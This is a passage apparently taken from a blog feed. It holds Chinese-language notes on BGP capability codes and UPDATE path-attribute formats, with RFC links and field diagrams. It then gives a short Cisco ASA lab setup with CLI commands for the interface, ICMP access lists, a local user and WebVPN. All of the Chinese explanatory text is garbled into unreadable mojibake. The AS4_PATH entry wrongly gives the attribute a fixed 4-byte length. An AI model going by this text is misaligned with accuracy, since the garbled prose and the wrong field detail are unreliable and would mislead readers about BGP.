class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|F|   Reserved  |<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc4724.html#section-3">=&gt; RFC4724 Sec 3.</a></p><h4 id="65-Support-for-4-octet-AS-number-capability"><a href="#65-Support-for-4-octet-AS-number-capability" class="headerlink" title="(65) Support for 4-octet AS number capability"></a>(65) Support for 4-octet AS number capability</h4><p><code>Capability Code</code>å­—æ®µä¸º65<br><code>Capability Length</code>å­—æ®µä¸º4<br><code>Capability Value</code>å­—æ®µä¸º4å­—èŠ‚çš„<code>AS number</code><br><a href="https://www.rfc-editor.org/rfc/rfc6793.html#section-3">=&gt; RFC6793 Sec 3.</a></p><h4 id="67-Support-for-Dynamic-Capability-capability-specific"><a href="#67-Support-for-Dynamic-Capability-capability-specific" class="headerlink" title="(67) Support for Dynamic Capability (capability specific)"></a>(67) Support for Dynamic Capability (capability specific)</h4><p><code>Capability Code</code>å­—æ®µä¸º67<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µæ˜¯ä¸€ä¸²<code>capability codes</code>ï¼Œæ¯ä¸ªä¸€å­—èŠ‚</p><pre><code class="hljs livecodeserver">The Capability Value field consists <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> capability codes (<span class="hljs-literal">one</span>-octet <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span>) that specify <span class="hljs-keyword">the</span> capabilities that MAY be revised dynamically <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> remote speaker.</code></pre><p><a href="https://datatracker.ietf.org/doc/html/draft-ietf-idr-dynamic-cap-16#section-2">=&gt; draft-ietf-idr-dynamic-cap-16 Sec 2.</a></p><h4 id="68-Multisession-BGP-Capability"><a href="#68-Multisession-BGP-Capability" class="headerlink" title="(68) Multisession BGP Capability"></a>(68) Multisession BGP Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º68<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µæ˜¯ä¸€ä¸ª<code>Flags</code>ï¼ˆ<code>G</code>+<code>Reserved</code>ï¼‰å’Œ0ä¸ªæˆ–å¤šä¸ª<code>capability codes</code>ç”¨äºåŒºåˆ«ä¸åŒçš„ç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5</span><span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|G|  Reserved   |  Session Id   ~<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+</code></pre><p><a href="https://datatracker.ietf.org/doc/html/draft-ietf-idr-bgp-multisession-07#section-4">=&gt; draft-ietf-idr-bgp-multisession-07 Sec 4.</a> </p><h4 id="69-ADD-PATH-Capability"><a href="#69-ADD-PATH-Capability" class="headerlink" title="(69) ADD-PATH Capability"></a>(69) ADD-PATH Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º69<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸ºä¸€ä¸ªæˆ–å¤šä¸ª<code>&lt;AFI, SAFI, Send/Receive&gt;</code>ä¸‰å…ƒç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+------------------------------------------------+</span>| Address Family Identifier (2 octets)           |<span class="hljs-code">+------------------------------------------------+</span>| Subsequent Address Family Identifier (1 octet) |<span class="hljs-code">+------------------------------------------------+</span>| Send/Receive (1 octet)                         |<span class="hljs-code">+------------------------------------------------+</span></code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc7911.html#section-4">=&gt; RFC7911 Sec 4.</a></p><h4 id="70-Enhanced-Route-Refresh-Capability"><a href="#70-Enhanced-Route-Refresh-Capability" class="headerlink" title="(70) Enhanced Route Refresh Capability"></a>(70) Enhanced Route Refresh Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º70<br><code>Capability Length</code>å­—æ®µä¸º0<br><a href="https://www.rfc-editor.org/rfc/rfc7313.html#section-3.1">=&gt; RFC7313 Sec 3.1.</a></p><h4 id="71-Long-Lived-Graceful-Restart-LLGR-Capability"><a href="#71-Long-Lived-Graceful-Restart-LLGR-Capability" class="headerlink" title="(71) Long-Lived Graceful Restart (LLGR) Capability"></a>(71) Long-Lived Graceful Restart (LLGR) Capability</h4><p><code>Capability Code</code>å­—æ®µä¸º71<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸º0ä¸ªæˆ–å¤šä¸ª<code>&lt;AFI, SAFI, Flags, Long-lived Stale Time&gt;</code>å››å…ƒç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------------------------------------------+</span>| Address Family Identifier (16 bits)              |<span class="hljs-code">+--------------------------------------------------+</span>| Subsequent Address Family Identifier (8 bits)    |<span class="hljs-code">+--------------------------------------------------+</span>| Flags for Address Family (8 bits)                |<span class="hljs-code">+--------------------------------------------------+</span>| Long-lived Stale Time (24 bits)                  |<span class="hljs-code">+--------------------------------------------------+</span>| ...                                              |<span class="hljs-code">+--------------------------------------------------+</span>| Address Family Identifier (16 bits)              |<span class="hljs-code">+--------------------------------------------------+</span>| Subsequent Address Family Identifier (8 bits)    |<span class="hljs-code">+--------------------------------------------------+</span>| Flags for Address Family (8 bits)                |<span class="hljs-code">+--------------------------------------------------+</span>| Long-lived Stale Time (24 bits)                  |<span class="hljs-code">+--------------------------------------------------+</span></code></pre><p><a href="https://www.ietf.org/archive/id/draft-ietf-idr-long-lived-gr-06.html#section-3.1">=&gt; RFC-ietf-idr-long-lived-gr-06 Sec 3.1</a></p><h4 id="72-Routing-Policy-Distribution"><a href="#72-Routing-Policy-Distribution" class="headerlink" title="(72) Routing Policy Distribution"></a>(72) Routing Policy Distribution</h4><p><code>Capability Code</code>å­—æ®µä¸º72<br><code>Capability Length</code>å­—æ®µä¸ºå˜é•¿<br><code>Capability Value</code>å­—æ®µä¸º1ä¸ªæˆ–å¤šä¸ª<code>&lt;AFI, SAFI, Send/Receive&gt;</code>ä¸‰å…ƒç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+--------------------------------------------------+</span>|  Address Family Identifier (2 octets)            |<span class="hljs-code">+--------------------------------------------------+</span>|  Subsequent Address Family Identifier (1 octet)  |<span class="hljs-code">+--------------------------------------------------+</span>|  Send/Receive (1 octet)                          |<span class="hljs-code">+--------------------------------------------------+</span></code></pre><p><a href="https://datatracker.ietf.org/doc/html/draft-ietf-idr-rpd-04#section-4.3">=&gt; draft-ietf-idr-rpd-04 Sec 4.3</a></p><h4 id="128-Prestandard-Route-Refresh-deprecated"><a href="#128-Prestandard-Route-Refresh-deprecated" class="headerlink" title="(128) Prestandard Route Refresh (deprecated)"></a>(128) Prestandard Route Refresh (deprecated)</h4><p>åŒ (2) Route Refresh Capability for BGP-4</p><h4 id="130-Prestandard-Outbound-Route-Filtering-deprecated"><a href="#130-Prestandard-Outbound-Route-Filtering-deprecated" class="headerlink" title="(130) Prestandard Outbound Route Filtering (deprecated)"></a>(130) Prestandard Outbound Route Filtering (deprecated)</h4><p>åŒ (3) Outbound Route Filtering Capability </p><h3 id="UPDATE-Message-Format"><a href="#UPDATE-Message-Format" class="headerlink" title="UPDATE Message Format"></a>UPDATE Message Format</h3><p><code>UPDATE Message</code>ä¸»è¦ç”¨æ¥æ„å»ºæè¿°å„ç§è‡ªæ²»åŸŸçš„å…³ç³»å›¾ï¼Œç”¨äºå‘<code>peer</code>é€šå‘Šå…±äº«å…¬å…±è·¯å¾„å±æ€§çš„å¯è¡Œè·¯ç”±æˆ–è€…æ’¤å›å¤šä¸ªä¸å¯è¡Œè·¯ç”±</p><p><code>update</code>ç»“æ„ä¸º<code>Withdrawn Routes Length</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>Withdrawn Routes</code>ï¼ˆå˜é•¿ï¼‰ã€<code>Total Path Attribute Length</code>ï¼ˆ2å­—èŠ‚ï¼‰ã€<code>Path Attributes</code>ï¼ˆå˜é•¿ï¼Œå…¶é•¿åº¦å€¼ä¸ºå‰ä¸€ä¸ªå­—æ®µï¼‰ã€<code>Network Layer Reachability Information</code>ï¼ˆå˜é•¿ï¼Œå…¶é•¿åº¦å€¼ä¸º<code>Header</code>é•¿åº¦å‡å»<code>Total Path Attribute Length</code>ï¼‰</p><pre><code class="hljs asciidoc"><span class="hljs-code">+-----------------------------------------------------+</span>|   Withdrawn Routes Length (2 octets)                |<span class="hljs-code">+-----------------------------------------------------+</span>|   Withdrawn Routes (variable)                       |<span class="hljs-code">+-----------------------------------------------------+</span>|   Total Path Attribute Length (2 octets)            |<span class="hljs-code">+-----------------------------------------------------+</span>|   Path Attributes (variable)                        |<span class="hljs-code">+-----------------------------------------------------+</span>|   Network Layer Reachability Information (variable) |<span class="hljs-code">+-----------------------------------------------------+</span></code></pre><p><code>Withdrawn Routes</code>ä¸­æ˜¯ä¸€äº›<code>IP address prefix</code>ï¼Œæ¯ä¸ª<code>IP address prefix</code>éƒ½æ˜¯<code>&lt;length, prefix&gt;</code>çš„äºŒå…ƒç»„</p><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------------+</span>|   Length (1 octet)        |<span class="hljs-code">+---------------------------+</span>|   Prefix (variable)       |<span class="hljs-code">+---------------------------+</span></code></pre><p>æ¯ä¸ª<code>Path Attributes</code>éƒ½æ˜¯ä¸€ç»„<code>&lt;attribute type, attribute length, attribute value&gt;</code>ä¸‰å…ƒç»„</p><p><code>Attribute Type</code>æ˜¯äºŒä¸ªå­—èŠ‚çš„å­—æ®µã€‚<code>Attr. Flags</code>ã€<code>Attr. Type Code</code>å‡ä¸€ä¸ªå­—èŠ‚</p><pre><code class="hljs asciidoc">0                   10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+|  Attr. Flags  |Attr. Type Code|<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-<span class="hljs-code">+-+</span>-+</code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><p><code>Attr. Flags</code>æ¯ä¸ª<code>bits</code>çš„<code>0/1</code>å‡æœ‰ä¸åŒçš„å«ä¹‰ï¼Œä¾‹å¦‚ç¬¬å››ä¸ª<code>bit</code>ï¼ˆ<code>bit 3</code>ï¼‰è¡¨ç¤ºæ˜¯å¦æ˜¯ä¸€ä¸ª<code>Extended</code>é•¿åº¦çš„æ¯”ç‰¹ä½ï¼Œå¦‚æœä¸º0ï¼Œåˆ™<code>Attribute Length</code>æ˜¯1ä¸ªå­—èŠ‚ï¼Œå¦‚æœä¸º1ï¼Œåˆ™æ˜¯2ä¸ªå­—èŠ‚</p><p><code>Attr. Type Code</code>å€¼å¦‚ä¸‹</p><p><img src="/img/BGP-Format/BGP-Update-Path-Attribute.png" alt="BGP-Update-Path-Attribute"></p><p>æ•´ä¸ªç»“æ„å¦‚ä¸‹</p><pre><code class="hljs mermaid">graph LRX(Path Attributes)--&gt; T1(tuple)T1(tuple)--&gt; A(attribute type)A--&gt;A1(Attr. Flags)A--&gt;A2(Attr. Type Code)T1(tuple)--&gt; B(attribute length)T1(tuple)--&gt; C(attribute value)X(Path Attributes)--&gt; T2(...)</code></pre><h4 id="1-ORIGIN"><a href="#1-ORIGIN" class="headerlink" title="(1) ORIGIN"></a>(1) ORIGIN</h4><p><code>Type Code</code>ä¸º1<br><code>Attribute Len</code>ä¸º1<br><code>Attribute Value</code>å¯ä»¥ä¸º<code>IGP(0)</code>ï¼Œ<code>EGP(1)</code>ï¼Œ<code>INCOMPLETE(2)</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><h4 id="2-AS-PATH"><a href="#2-AS-PATH" class="headerlink" title="(2) AS_PATH"></a>(2) AS_PATH</h4><p><code>Type Code</code>ä¸º2<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸ºä¸€ç»„<code>AS path segments</code>ï¼Œæ¯ä¸€ä¸ª<code>AS path segments</code>è¡¨ç¤ºä¸º<code>&lt;path segment typeï¼ˆ1å­—èŠ‚ï¼‰, path segment lengthï¼ˆ1å­—èŠ‚ï¼‰, path segment valueï¼ˆå˜é•¿ï¼‰&gt;</code>ä¸‰å…ƒç»„ï¼Œ</p><p><code>path segment type</code>å¯ä»¥ä¸º<code>AS_SET(1)</code>ï¼Œ<code>AS_SEQUENCE(2)</code><br><code>path segment length</code>ä¸º<code>ASes</code>çš„ä¸ªæ•°ï¼ˆä¸æ˜¯<code>path segment value</code>çš„å­—èŠ‚é•¿åº¦ï¼‰<br><code>path segment value</code>ä¸ºä¸€ä¸ªæˆ–å¤šä¸ª<code>AS</code>ç¼–å·ï¼Œæ¯ä¸ªç¼–å·2ä¸ªå­—èŠ‚</p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><p>æ•´ä¸ªç»“æ„å¦‚ä¸‹</p><pre><code class="hljs mermaid">graph LRX(Attribute Value)--&gt; T1(AS path segments)T1(AS path segments)--&gt; A(path segment type)T1(AS path segments)--&gt; B(path segment length)T1(AS path segments)--&gt; C(path segment value)C(path segment value)--&gt; C1(AS number)C(path segment value)--&gt; C2(...)X(Path Attributes)--&gt; T2(...)</code></pre><h4 id="3-NEXT-HOP"><a href="#3-NEXT-HOP" class="headerlink" title="(3) NEXT_HOP"></a>(3) NEXT_HOP</h4><p><code>Type Code</code>ä¸º3<br><code>Attribute Len</code>ä¸º4<br><code>Attribute Value</code>ä¸º<code>IP address</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><h4 id="4-MULTI-EXIT-DISC"><a href="#4-MULTI-EXIT-DISC" class="headerlink" title="(4) MULTI_EXIT_DISC"></a>(4) MULTI_EXIT_DISC</h4><p><code>Type Code</code>ä¸º4<br><code>Attribute Len</code>ä¸º4<br><code>Attribute Value</code>ä¸º4ä¸ªå­—èŠ‚çš„æ— ç¬¦å·æ•´æ•°ï¼Œç”¨äºåŒºåˆ«é‚»å±…è‡ªæ²»åŸŸçš„å…¥å£ç‚¹</p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><h4 id="5-LOCAL-PREF"><a href="#5-LOCAL-PREF" class="headerlink" title="(5) LOCAL_PREF"></a>(5) LOCAL_PREF</h4><p><code>Type Code</code>ä¸º5<br><code>Attribute Len</code>ä¸º4<br><code>Attribute Value</code>ä¸º4ä¸ªå­—èŠ‚çš„æ— ç¬¦å·æ•´æ•°ï¼Œç”¨äºé€šçŸ¥å†…éƒ¨å¯¹ç­‰èŠ‚ç‚¹ï¼Œå¹¿å‘Šè·¯ç”±çš„åå¥½ç¨‹åº¦ï¼ˆä¸æ˜¯å¾ˆç†è§£ï¼‰</p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><h4 id="6-ATOMIC-AGGREGATE"><a href="#6-ATOMIC-AGGREGATE" class="headerlink" title="(6) ATOMIC_AGGREGATE"></a>(6) ATOMIC_AGGREGATE</h4><p><code>Type Code</code>ä¸º6<br><code>Attribute Len</code>ä¸º0</p><p><a href="https://www.rfc-editor.org/rfc/rfc4271.html#section-4.3">=&gt; RFC4271 Sec 4.3</a></p><h4 id="7-AGGREGATOR"><a href="#7-AGGREGATOR" class="headerlink" title="(7) AGGREGATOR"></a>(7) AGGREGATOR</h4><p><code>Type Code</code>ä¸º7<br><code>Attribute Len</code>ä¸º6ï¼ˆæŸäº›å®ç°ä¸‹ä¸º8ï¼Œå³<code>AS number(4å­—èŠ‚)</code>ï¼‰<br><code>Attribute Value</code>ä¸º<code>the last AS number(2å­—èŠ‚)</code>ï¼Œ<code>the IP address(4å­—èŠ‚)</code></p><h4 id="8-COMMUNITIES"><a href="#8-COMMUNITIES" class="headerlink" title="(8) COMMUNITIES"></a>(8) COMMUNITIES</h4><p><code>Type Code</code>ä¸º8<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸ºä¸€ç»„4å­—èŠ‚çš„<code>community</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc1997.html">=&gt; RFC1997</a></p><h4 id="9-ORIGINATOR-ID"><a href="#9-ORIGINATOR-ID" class="headerlink" title="(9) ORIGINATOR_ID"></a>(9) ORIGINATOR_ID</h4><p><code>Type Code</code>ä¸º9<br><code>Attribute Len</code>ä¸º4<br><code>Attribute Value</code>ä¸ºæœ¬åœ°è‡ªæ²»åŸŸçš„<code>BGP Identifier</code></p><p><code>ORIGINATOR_ID</code>å’Œ<code>CLUSTER_LIST</code>ä¸€èµ·æ˜¯é˜²æ­¢è·¯ç”±ç¯è·¯çš„</p><p><a href="https://www.rfc-editor.org/rfc/rfc4456.html#section-8">=&gt; RFC4456 Sec 8.</a></p><h4 id="10-CLUSTER-LIST"><a href="#10-CLUSTER-LIST" class="headerlink" title="(10) CLUSTER_LIST"></a>(10) CLUSTER_LIST</h4><p><code>Type Code</code>ä¸º10<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸ºä¸€ç»„4å­—èŠ‚çš„<code>CLUSTER_ID</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc4456.html#section-8">=&gt; RFC4456 Sec 8.</a></p><h4 id="14-MP-REACH-NLRI"><a href="#14-MP-REACH-NLRI" class="headerlink" title="(14) MP_REACH_NLRI"></a>(14) MP_REACH_NLRI</h4><p><code>Type Code</code>ä¸º14<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸º<code>AFI(2å­—èŠ‚)</code>ã€<code>SAFI(1å­—èŠ‚)</code>ã€<code>Length of Next Hop Network Address(1å­—èŠ‚)</code>ã€<code>Network Address of Next Hop(å˜é•¿)</code>ã€<code>Reserved(1å­—èŠ‚)</code>ã€<code>NLRI(å˜é•¿)</code></p><p><code>Network Address of Next Hop</code>å’Œ<code>NLRI</code>å‡ç”±<code>&lt;AFI, SAFI&gt;</code>æ ‡è¯†</p><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------------------------------------------+</span>| Address Family Identifier (2 octets)                    |<span class="hljs-code">+---------------------------------------------------------+</span>| Subsequent Address Family Identifier (1 octet)          |<span class="hljs-code">+---------------------------------------------------------+</span>| Length of Next Hop Network Address (1 octet)            |<span class="hljs-code">+---------------------------------------------------------+</span>| Network Address of Next Hop (variable)                  |<span class="hljs-code">+---------------------------------------------------------+</span>| Reserved (1 octet)                                      |<span class="hljs-code">+---------------------------------------------------------+</span>| Network Layer Reachability Information (variable)       |<span class="hljs-code">+---------------------------------------------------------+</span></code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc4760.html#section-3">=&gt; RFC4760 Sec 3.</a></p><h4 id="15-MP-UNREACH-NLRI"><a href="#15-MP-UNREACH-NLRI" class="headerlink" title="(15) MP_UNREACH_NLRI"></a>(15) MP_UNREACH_NLRI</h4><p><code>Type Code</code>ä¸º15<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸º<code>AFI(2å­—èŠ‚)</code>ã€<code>SAFI(1å­—èŠ‚)</code>ã€<code>Withdrawn Routes(å˜é•¿)</code></p><pre><code class="hljs asciidoc"><span class="hljs-code">+---------------------------------------------------------+</span>| Address Family Identifier (2 octets)                    |<span class="hljs-code">+---------------------------------------------------------+</span>| Subsequent Address Family Identifier (1 octet)          |<span class="hljs-code">+---------------------------------------------------------+</span>| Withdrawn Routes (variable)                             |<span class="hljs-code">+---------------------------------------------------------+</span></code></pre><p><code>Withdrawn Routes</code>ç”±<code>&lt;AFI, SAFI&gt;</code>æ ‡è¯†</p><p><a href="https://www.rfc-editor.org/rfc/rfc4760.html#section-4">=&gt; RFC4760 Sec 4.</a></p><h4 id="16-EXTENDED-COMMUNITIES"><a href="#16-EXTENDED-COMMUNITIES" class="headerlink" title="(16) EXTENDED COMMUNITIES"></a>(16) EXTENDED COMMUNITIES</h4><p><code>Type Code</code>ä¸º16<br><code>Attribute Len</code>ä¸ºå˜é•¿<br><code>Attribute Value</code>ä¸ºä¸€ç³»åˆ—<code>extended communities</code>ï¼Œæ¯ä¸ª<code>Extended Community</code>å‡æ˜¯8ä¸ªå­—èŠ‚çš„å¦‚ä¸‹ç»“æ„</p><p>å¦‚æœæ˜¯<code>Regular type</code>ï¼Œåˆ™æ˜¯1ä¸ªå­—èŠ‚ï¼Œå¦‚æœæ˜¯<code>Extended type</code>ï¼Œåˆ™æ˜¯2ä¸ªå­—èŠ‚</p><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">Type Field  :</span> <span class="hljs-number">1</span> <span class="hljs-string">or</span> <span class="hljs-number">2</span> <span class="hljs-string">octets</span><span class="hljs-bullet">-</span> <span class="hljs-attr">Value Field :</span> <span class="hljs-string">Remaining</span> <span class="hljs-string">octets</span> <span class="hljs-number">0</span>                   <span class="hljs-number">1</span>                   <span class="hljs-number">2</span>                   <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><span class="hljs-string">|</span>  <span class="hljs-string">Type</span> <span class="hljs-string">high</span>    <span class="hljs-string">|</span>  <span class="hljs-string">Type</span> <span class="hljs-string">low(*)</span>  <span class="hljs-string">|</span>                               <span class="hljs-string">|</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>          <span class="hljs-string">Value</span>                <span class="hljs-string">|</span><span class="hljs-string">|</span>                                                               <span class="hljs-string">|</span><span class="hljs-string">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></code></pre><p><a href="https://www.rfc-editor.org/rfc/rfc4360.html#section-2">=&gt; RFC4360 Sec 2.</a></p><h4 id="17-AS4-PATH"><a href="#17-AS4-PATH" class="headerlink" title="(17) AS4_PATH"></a>(17) AS4_PATH</h4><p><code>Type Code</code>ä¸º17<br><code>Attribute Len</code>ä¸º4<br><code>Attribute Value</code>ä¸º4å­—èŠ‚çš„<code>AS4_PATH</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc6793.html#section-9">=&gt; RFC6793 Sec 9.</a></p><h4 id="18-AS4-AGGREGATOR"><a href="#18-AS4-AGGREGATOR" class="headerlink" title="(18) AS4_AGGREGATOR"></a>(18) AS4_AGGREGATOR</h4><p><code>Type Code</code>ä¸º18<br><code>Attribute Len</code>ä¸º8<br><code>Attribute Value</code>ä¸º<code>the last AS number(4å­—èŠ‚)</code>ï¼Œ<code>the IP address(4å­—èŠ‚)</code></p><p><a href="https://www.rfc-editor.org/rfc/rfc6793.html#section-9">=&gt; RFC6793 Sec 9.</a></p>]]></content>
    
    
    <categories>
      
      <category>protocol</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BGP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ASA ç¯å¢ƒæ­å»º</title>
    <link href="/2023/07/20/ASA%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2023/07/20/ASA%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="ASA-cli"><a href="#ASA-cli" class="headerlink" title="ASA cli"></a>ASA cli</h2><p>é€šè¿‡ä»¥ä¸‹æŒ‡ä»¤è®¾ç½®<code>ip</code>ï¼Œå¼€å¯<code>icmp</code>å’Œ<code>http</code></p><pre><code class="hljs routeros">ciscoasa&gt; enciscoasa# configure tciscoasa(config)#<span class="hljs-built_in"> interface </span>GigabitEthernet0/0ciscoasa(config-if)# nameif outsideciscoasa(config-if)#<span class="hljs-built_in"> ip address </span>192.168.152.233 255.255.255.0ciscoasa(config-if)# <span class="hljs-literal">no</span> shutdownciscoasa(config)# access-list permit-ping extended permit icmp any any time-exceededciscoasa(config)# access-list permit-ping extended permit icmp any any unreachableciscoasa(config)# access-list permit-ping extended permit icmp any any echociscoasa(config)# access-list permit-ping extended permit icmp any any echo-replyciscoasa(config)# access-group permit-ping <span class="hljs-keyword">in</span><span class="hljs-built_in"> interface </span>outsideciscoasa(config)# icmp permit any outsideciscoasa(config)# write memciscoasa(config)# username Cisco password examplepassword1 privilege 15ciscoasa(config)# write mem</code></pre><p>é…ç½®å¥½ä¹‹åï¼Œç”¨ ASDM è¿æ¥ï¼ˆæ³¨ï¼šASDM éœ€è¦ç”¨ Java8 æ‰è¡Œï¼‰</p><p>åç»­å¯ä»¥å‚ç…§è¿™ç¯‡é…ç½® <a href="https://www.cisco.com/c/zh_cn/support/docs/security-vpn/webvpn-ssl-vpn/119417-config-asa-00.html">webvpn</a></p><pre><code class="hljs routeros">ciscoasa# configure tciscoasa(config)# http<span class="hljs-built_in"> server </span>enableciscoasa(config)# http 192.168.152.0 255.255.255.0 outsideciscoasa(config)# webvpn ciscoasa(config-webvpn)# <span class="hljs-builtin-name">enable</span> outsideINFO: WebVPN <span class="hljs-keyword">and</span> DTLS are enabled on <span class="hljs-string">&#x27;outside&#x27;</span>.ciscoasa(config-webvpn)# write mem</code></pre><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><blockquote><p><a href="https://www.cisco.com/c/zh_cn/td/docs/security/asa/asa916/configuration/general/asa-916-general-config/intro-intro.html">https://www.cisco.com/c/zh_cn/td/docs/security/asa/asa916/configuration/general/asa-916-general-config/intro-intro.html</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>setup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ASA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FortiGate ç¯å¢ƒæ­å»º 7.2.4</title>
    <link href="/2023/06/12/FortiGate%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%207.2.4/"/>
    <url>/2023/06/12/FortiGate%20%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%207.2.4/</url>
    
